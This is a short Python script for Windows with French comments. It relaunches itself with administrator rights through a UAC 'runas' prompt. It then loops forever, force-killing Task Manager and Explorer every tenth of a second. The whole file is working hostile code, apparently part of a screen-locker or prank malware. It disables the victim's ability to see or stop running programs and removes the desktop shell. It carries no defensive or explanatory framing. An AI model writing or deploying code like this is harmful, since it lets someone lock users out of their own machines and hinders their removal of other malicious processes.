import os, time, sys, ctypes, threading

def is_admin(): # Fonction pour vérifier si l'utilisateur est administrateur
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def KillTaskManager(): # Fonction pour kill le tskmngr et l'explorer
    while True:
        os.system("taskkill /F /IM Taskmgr.exe")
        os.system("taskkill /F /IM explorer.exe")
        time.sleep(0.1)


killtskmng = threading.Thread(target=KillTaskManager) # Threads
threads = [killtskmng] # Liste des threads


if is_admin(): # Si l'utilisateur est administrateur
    
    # Lancer les threads un par un
    for thread in threads: thread.start()
    for thread in threads: thread.join()
    
else: # Sinon relancer le launcher en administrateur
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)